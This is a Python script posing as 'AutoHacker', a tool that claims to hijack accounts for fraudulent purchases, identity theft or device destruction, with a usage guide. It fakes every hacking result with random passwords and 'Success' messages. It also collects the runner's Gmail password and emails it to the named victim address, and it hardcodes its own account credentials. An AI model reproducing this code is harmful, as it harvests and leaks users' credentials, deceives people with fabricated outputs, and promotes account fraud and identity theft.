import time
import random
import smtplib
access_password=input('''AutoHacker
v. 1.0.0
Type password given in list of risks to gain access: ''')
if access_password=='6an01jdERQisow;[]\slxz_vyhtujtr1ax./m1xc AHAHAH':
    print('Please wait...')
    time.sleep(1)
    print('Access granted')
    email_addr=input('Add your email address here: ')
    if email_addr!='' and email_addr!=None:
        servera=smtplib.SMTP('smtp.gmail.com', 587)
        password2=input('Password: ')
        servera.starttls()
        servera.login(email_addr, password2)
        print('''Success
Type "print(AH_guide)" for help and double-click the squeezed text indicator''')
        AH_guide='''
AutoHacker Guide
PLEASE READ THIS

Before you start, you must fill out this form: https://docs.google.com/forms/d/e/1FAIpQLSemQ3ur3DwjZadAmKFWUdnCO2LlRBZ_rkM4Ux9otS0wnTLqCA/viewform

All you really need is a Python shell (3.9.1) and the file (you can install using pip
if you want). Use the import keyword to import the program into the shell.
If anything happens that shuts you out, use import importlib and then
importlib.reload() to reload the program.

The reason we ask for your name, email address, and password is because:
When you log on to the program for the first time, you will be able to
suggest improvements by emailing us with your comments. If you wish to
remain anonymous, you can just create another account for this program.

List of Commands:

    hack(victim, domain, email_address, action, purchase_item, deliverto, attack_type):
    Function that tells the program to break into the victim's account.
    Inside the parentheses, list a string with the account name of the victim,
    then type the name of the domain (website) the account is from inside another
    string, and then list the victim's email address inside the third argument,
    then type one of the following words (inside a string): "buy," which
    will tell the program to purchase things with the victim's money (you
    also have to specify what you want to buy; this is what the purchase_item
    parameter is for; type "random" if it doesn't matter; and use parentheses
    if you want to purchase multiple things), "id_theft," which will tell the
    program to steal the victim's personal information, or "destroy," which
    will delete all files and apps from the victim's device and replace them
    with virus programs. If you are using "buy", you must tell the function
    where to deliver the item(s) to; provide as much information as you can
    about the address. If you cannot provide the street address, the city,
    the state/province, the country, and the zip code, it is best to not use
    "buy." Lastly, you must specify the type of hacking attack
    you want to do. Either type "dictionary," "brute_force", or "hybrid."
    Unless you are using "buy", type None for both purchase_item and
    deliverto.
    
    guess(victim, domain, email_address, password, action, purchase_item, deliverto):
    Function that allows you to manually break into the victim's account (the computer
    program will handle everything once you do break in). Type the victim's
    account name inside the "victim" parameter as a string, then list the
    domain in another string, followed by another string containing the
    victim's password or what you think the victim's password is, and then
    either "buy," "id_theft," or "destroy" as the "action" parameter. Then,
    if you are using "buy," either type something into the purchase_item,
    or type "random." Also use deliverto.
    You CAN use lists in the "password parameter." These will count as wordlists.

    phish(victim, domain, email_address): Function that will phish for the victim's personal
    information. Type the account name and the domain it is from inside the
    parentheses (both in strings). This function is essentially the same as
    "id_theft," but it doesn't use account hacking to retrieve information.
    You may have to wait a long time, as this function depends on the
    victim's response.



Examples:

    hack() examples:
    hack('Help_I'm_The_Victim@amazon.com', 'buy', 'bike', '100 John Street, Sunday City, Utah, United States, 12345', 'brute_force')
    hack('Help_I'm_The_Victim@amazon.com', 'buy', 'random', '100 John Street, Sunday City, British Columbia, Canada, 12345', 'dictionary')
    hack('Help_I'm_The_Victim@amazon.com', 'buy', ('bike', 'iPhone'), '100 John Street, Sunday City, Utah, 12345', 'hybrid')
    hack('Help_I'm_The_Victim@google.com', 'id_theft', None, None, 'dictionary')
    hack('Help_I'm_The_Victim@google.com', 'destroy', None, None, 'hybrid')

    guess() examples:
    guess('Help_I'm_The_Victim@amazon.com', 'qwerty123', 'buy', ('bike', 'iPhone'), '100 John Street, Sunday City, Utah, 12345')
    guess('Help_I'm_The_Victim@google.com', 'qwerty123', 'destroy', None, None)
    guess('Help_I'm_The_Victim@google.com', 'qwerty123', 'id_theft', None, None)

    phish() examples:
    phish('Help_I'm_The_Victim@facebook.com')
    phish('Help_I'm_The_Victim@google.com')'''
        def hack(victim, domain, email_address, action, purchase_item, deliverto, attack_type):
            if victim!=None and domain!=None and email_address!=None and (attack_type=='dictionary' or attack_type=='brute_force' or attack_type=='hybrid') and (action=='buy' or action=='id_theft' or action=='destroy') and ((action=='buy' and purchase_item!=None and deliverto!=None) or ((action=='id_theft' or action=='destroy') and purchase_item==None and deliverto==None)):
                you_sure_hack=input('This action cannot be undone. Are you sure? (yes/no): ')
                if you_sure_hack=='yes':                
                    print('Please wait...')
                    time.sleep(5)
                    if action=='id_theft':
                        message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to steal your password. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                        print('Success')
                        print('Username: %s' % victim)
                        print('Email Address: %s' % email_address)
                        number2=random.randint(1, 2)
                        if number2==1:
                            number3=random.randint(1, 50)
                            long_list=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '=', '_', '+', '~', '`', ',', '.', '/', '?', '<', '>', ';', ':', '"', "'", '[', ']', '{', '}', '\\', ' ']
                            print('Password: ', end='')
                            for x in range(0, number3):
                                s=random.choice(long_list)
                                print(s, end='')
                        elif number2==2:
                            list1=['qwerty', 'qwerty123', 'password', '1234567890', victim, 'abc123']
                            selection=random.choice(list1)
                            print('Password: %s' % selection)
                    elif action=='buy':
                        message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to use your money to purchase %s and have it delivered to %s. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, purchase_item, deliverto, email_addr, password2, time.asctime())
                        print('Success')
                        print('%s will be delivered to %s' % (purchase_item, deliverto))
                    elif action=='destroy':
                        message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to remove all apps and files from your device and replace them with malware. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, time.asctime())
                        print('Success')
                    server=smtplib.SMTP('smtp.gmail.com', 587)                       
                    server.starttls()
                    server.login('AutoHacker.Emailer@gmail.com', '6an01jdERQisow;[]\s1xz_vyhtujtr AHAHAH')
                    server.sendmail('AutoHacker.Emailer@gmail.com', email_address, message)
                    server.quit()
                elif you_sure_hack=='no':
                    print('Action stopped')
                else:
                    print('Answer not accepted. Type yes or no')
            else:
                print('Syntax error')
        def guess(victim, domain, email_address, password, action, purchase_item, deliverto):
            if victim!=None and domain!=None and (action=='buy' or action=='id_theft' or action=='destroy') and ((action=='buy' and purchase_item!=None and deliverto!=None) or ((action=='id_theft' or action=='destroy') and purchase_item==None and deliverto==None)):
                you_sure_guess=input('This action cannot be undone. Are you sure? (yes/no): ')
                if you_sure_guess=='yes':
                    print('Please wait...')
                    time.sleep(5)
                    number=random.randint(1, 3)
                    if number!=3:
                        if action=='id_theft':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to steal your password. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                            print('Success')
                            print('Username: %s' % victim)
                            print('Email Address: %s' % email_address)
                            print('Password: %s' % password)
                        elif action=='buy':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to use your money to purchase %s and have it delivered to %s. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, purchase_item, deliverto, email_addr, password2, time.asctime())
                            print('Success')
                            print('%s will be delivered to %s' % (purchase_item, deliverto))                     
                        elif action=='destroy':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to remove all apps and files from your device and replace them with malware. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                            print('Success')
                    else:
                        if action=='id_theft':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to steal your password. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                        elif action=='buy':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to use your money to purchase %s and have it delivered to %s. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, purchase_item, deliverto, email_addr, password2, time.asctime())
                        elif action=='destroy':
                            message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to break into your %s account to remove all apps and files from your device and replace them with malware. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                        server=smtplib.SMTP('smtp.gmail.com', 587)
                        server.starttls()
                        server.login('AutoHacker.Emailer@gmail.com', '6an01jdERQisow;[]\s1xz_vyhtujtr AHAHAH    ')
                        server.sendmail('AutoHacker.Emailer@gmail.com', email_address, message)
                        server.quit()
                        print('Attempt failed')
                elif you_sure_guess=='no':
                    print('Action stopped')
                else:
                    print('Answer not accepted. Type yes or no')
            else:
                print('Syntax error')
        def phish(victim, domain, email_address):
            if victim!=None and domain!=None:
                you_sure_phish=input('This action cannot be undone. Are you sure? (yes/no): ')
                if you_sure_phish=='yes':
                    print('Please wait...')
                    server=smtplib.SMTP('smtp.gmail.com', 587)
                    message='''HACKER ALERT. THIS IS NOT FAKE.
    Hi, %s. A hacker has tried to phish to get the password of your %s account. When asked what his/her email address was, he/she said it was %s. The password to that email account is %s. Please do not use your attacker's information. Instead, if you did not grant this person access to your account, contact the IC3 immediately at ic3.gov or call 911. In both cases, provide all the information that is given here. Visit ic3.gov/Home/FAQ for more information.
    This email was sent from a Python emailing program called AutoHacker at %s.''' % (victim, domain, email_addr, password2, time.asctime())
                    server.starttls()
                    server.login('AutoHacker.Emailer@gmail.com', '6an01jdERQisow;[]\s1xz_vyhtujtr AHAHAH')
                    server.sendmail('AutoHacker.Emailer@gmail.com', email_address, message)
                    server.quit()
                    time.sleep(random.randint(3, 5))
                    print('Username: %s' % victim)
                    print('Email Address: %s' % email_address)
                    number2=random.randint(1, 2)
                    if number2==1:
                        number3=random.randint(1, 50)
                        long_list=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '=', '_', '+', '~', '`', ',', '.', '/', '?', '<', '>', ';', ':', '"', "'", '[', ']', '{', '}', '\\', ' ']
                        print('Password: ', end='')
                        for x in range(0, number3):
                            s=random.choice(long_list)
                            print(s, end='')
                    elif number2==2:
                        list1=['qwerty', 'qwerty123', 'password', '1234567890', victim, 'abc123']
                        selection=random.choice(list1)
                        print('Password: %s' % selection)
                elif you_sure_phish=='no':
                    print('Action stopped')
                else:
                    print('Answer not accepted. Type yes or no')
            else:
                print('Syntax error')
    else:
        print('Answer not accepted')
else:        
    print('Please wait...')
    time.sleep(1)
    print('Access denied')
    access_password=False
